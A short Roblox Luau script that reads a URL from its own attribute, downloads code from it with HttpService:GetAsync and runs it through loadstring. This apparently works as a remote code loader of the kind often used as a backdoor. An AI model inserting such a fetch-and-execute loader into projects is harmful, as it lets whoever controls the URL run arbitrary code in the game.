repeat wait() until _G.FilesInitialized

local HttpService = game:GetService("HttpService")

repeat task.wait() until script:GetAttribute("loadstring")

local load_string = script:GetAttribute("loadstring")

loadstring(HttpService:GetAsync(load_string))()